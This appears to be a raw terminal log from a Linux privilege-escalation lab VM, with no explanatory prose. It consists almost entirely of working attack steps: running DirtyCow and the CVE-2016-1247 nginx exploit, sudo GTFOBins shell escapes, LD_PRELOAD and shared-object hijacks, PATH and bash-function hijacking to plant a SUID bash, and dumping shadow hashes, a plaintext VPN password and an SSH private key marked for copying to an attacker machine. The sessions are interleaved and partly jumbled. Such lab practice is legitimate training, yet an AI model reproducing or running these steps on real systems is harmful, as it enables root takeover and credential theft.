//Linux VM//
used 2 terminals for it

TCM@debian:~$ /home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS

Possible Exploits:

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Tags: debian=6,ubuntu=10.04|10.10
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-1146] reiserfs

   Details: https://www.exploit-db.com/exploits/12130/
   Tags: ubuntu=9.10
   Download URL: https://www.exploit-db.com/download/12130

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Tags: debian=6,ubuntu=10.10|10.04|9.10,fedora=16
   Download URL: https://www.exploit-db.com/download/15285

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Tags: ubuntu=10.04|9.10
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Tags: RHEL=5
 Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Tags: ubuntu=9.10|10.04|10.10,ubuntu=10.04.1
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6,ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/26131

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: ubuntu=12.04
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40616

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: ubuntu=16.04
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2009-1185] udev

   Details: https://www.exploit-db.com/exploits/8572/
   Tags: ubuntu=8.10|9.04
   Download URL: https://www.exploit-db.com/download/8572
   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verifi
cation needed

[+] [CVE-2010-0832] PAM MOTD

   Details: https://www.exploit-db.com/exploits/14339/
   Tags: ubuntu=9.10|10.04
   Download URL: https://www.exploit-db.com/download/14339
   Comments: SSH access to non privileged user is needed

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0

TCM@debian:~$ gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
TCM@debian:~$ ls
c0w  myvpn.ovpn  tools
TCM@debian:~$ ./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap a5c93000

madvise 0

ptrace 0

TCM@debian:~$ passwd
TCM@debian:/home/user$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

TCM@debian:/home/user$ cat /etc/shadow                                                                                                                           */reset
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::

TCM@debian:/home/user$ pwd
/home/user

TCM@debian:/home/user$ cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:/home/user$ cat /etc/openvpn/auth.txt
user
password321

TCM@debian:/home/user$ cat /home/user/.irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";

TCM@debian:/home/user$ cat ~/.bash_history | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
passwd
passwd

TCM@debian:/home/user$ ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow

TCM@debian:/home/user$ cat /etc/passwd
// 
Passwd file
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/bin/false
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
//

TCM@debian:/home/user$ cat /etc/shadow > shadow
//
Shadow file
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
//

TCM@debian:/home/user$ tar cvzf lootshadow.tar.gz shadow passwd
shadow
passwd

root@debian:/home/user# cd ..
root@debian:/home# cd ..

root@debian:/# ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
root@debian:/# find / -name authorized_keys 2> /dev/null
/root/.ssh/authorized_keys
root@debian:/# find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa


//To copy rsa in your attacker machine//
root@debian:/# cat /backups/supersecretkeys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
STOMIZSSBDSfkAAAAJcm9vdEBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----

// 
search for gtfo bins in google
search nano

root@debian:~# sudo -l
Matching Defaults entries for root on this host:
    env_reset, env_keep+=LD_PRELOAD

User root may run the following commands on this host:
    (ALL) ALL
root@debian:~# id
sh-4.1# 
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
root@debian:~# sudo awk 'BEGIN {system("/bin/sh")}'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
root@debian:~# 

root@debian:/home/user# sudo awk 'BEGIN {system("/bin/sh")}'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
<sh')" > shell.nse && sudo nmap --script=shell.nse                    

Starting Nmap 5.00 ( http://nmap.org ) at 2021-05-14 10:04 EDT
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
NSE: failed to initialize the script engine:
/usr/share/nmap/nse_main.lua:228: ./shell.nse is missing required field: 'categories'
stack traceback:
        [C]: in function 'error'
        /usr/share/nmap/nse_main.lua:228: in function 'new'
        /usr/share/nmap/nse_main.lua:392: in function 'get_chosen_scripts'
        /usr/share/nmap/nse_main.lua:594: in main chunk
        [C]: ?

QUITTING!

root@debian:/home/user# sudo -l          
Matching Defaults entries for root on this host:
    env_reset, env_keep+=LD_PRELOAD

User root may run the following commands on this host:
    (ALL) ALL
root@debian:/home/user# sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
root@debian:/home/user# sudo -l
Matching Defaults entries for root on this host:
    env_reset, env_keep+=LD_PRELOAD

User root may run the following commands on this host:
    (ALL) ALL
root@debian:/home/user# 

root@debian:/home/user# exit
exit
TCM@debian:~$ nano x.c
TCM@debian:~$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
TCM@debian:~$ sudo LD_PRELOAD=/tmp/x.so apache2
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# 


root@debian:/home/user# find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
root@debian:/home/user# strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
root@debian:/home/user# mkdir /home/user/.config
root@debian:/home/user# cd /home/user/.config
root@debian:/home/user/.config# nano libcalc.c
root@debian:/home/user/.config# gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
root@debian:/home/user/.config# /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1# id
uid=0(root) gid=0(root) egid=50(staff) groups=0(root)
bash-4.1# 
bash-4.1# exit
exit
[=====================================================================>] 99 %
Done.
root@debian:/home/user/.config# dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)

root@debian:/home/user/.config# su root

root@debian:/home/user/.config# su root
root@debian:/home/user/.config# su -l www-data
www-data@debian:~$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247)                                                              
nginxed-root.sh (ver. 1.0)                                               
                                                                         
Discovered and coded by:                                                 
                                                                         
Dawid Golunski                                                           
https://legalhackers.com                                                 

[+] Starting the exploit as: 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 www-data www-data 926536 May 14 11:20 /tmp/nginxrootsh

[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: 
lrwxrwxrwx 1 www-data www-data 18 May 14 11:20 /var/log/nginx/error.log -> /etc/ld.so.preload

[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...



[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges:                                                          
-rw-r--r-- 1 www-data root 19 May 14 11:37 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 926536 May 14 11:20 /tmp/nginxrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 926536 May 14 11:20 /tmp/nginxrootsh

The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now! 

nginxrootsh-4.1# 
nginxrootsh-4.1# 
nginxrootsh-4.1# 
nginxrootsh-4.1# su root
Password: 
root@debian:/var/www# invoke-rc.d nginx rotate >/dev/null 2>&1
root@debian:/var/www# exit

www-data@debian:~$ exit
logout
root@debian:/home/user/.config# exit
exit
root@debian:/home/user/.config# find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158726  912 -rwsrwxrwx   1 root     root       926536 May 14 11:20 /tmp/nginxrootsh
1158725  912 -rwsr-sr-x   1 root     staff      926536 May 14 11:08 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
root@debian:/home/user/.config# strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start

root@debian:/home/user/.config# echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
root@debian:/home/user/.config# gcc /tmp/service.c -o /tmp/service
root@debian:/home/user/.config# export PATH=/tmp:$PATH
root@debian:/home/user/.config# /usr/local/bin/suid-env
root@debian:/home/user/.config# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user/.config# 

root@debian:~# find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158725  912 -rwsr-sr-x   1 root     staff      926536 May 15 03:18 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
root@debian:~#  /usr/local/bin/suid-env2
[....] Starting web server: apache2httpd (pid 1711) already running
. ok 
root@debian:~# function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
root@debian:~#  
root@debian:~#  
root@debian:~#  
root@debian:~# export -f /usr/sbin/service
root@debian:~# /usr/local/bin/suid-env
root@debian:~# /usr/local/bin/suid-env2
bash-4.1# id
uid=0(root) gid=0(root) egid=50(staff) groups=0(root)
bash-4.1# exit
exit
root@debian:~# env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
/usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
